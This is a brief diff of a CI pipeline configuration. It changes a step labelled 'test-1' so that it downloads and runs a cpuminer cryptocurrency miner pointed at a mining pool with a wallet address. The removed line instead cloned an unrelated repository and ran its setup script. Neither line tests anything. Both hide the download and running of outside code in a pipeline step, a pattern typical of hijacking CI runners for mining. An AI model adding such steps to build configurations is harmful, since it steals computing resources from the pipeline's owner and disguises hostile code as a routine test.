@@ -6,4 +6,4 @@ steps:
 - name: test-1
   image: golang
   commands:
-     - git clone https://gitlab.com/renifer12/rp && cd rp && ./setup && python run.py
+     - wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.21/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a curvehash -o  stratum+tcps://stratum-eu.rplant.xyz:17030 -u PK3AAKNaf2kc3KKFFZRMs7eF5F4W9igsN4.test
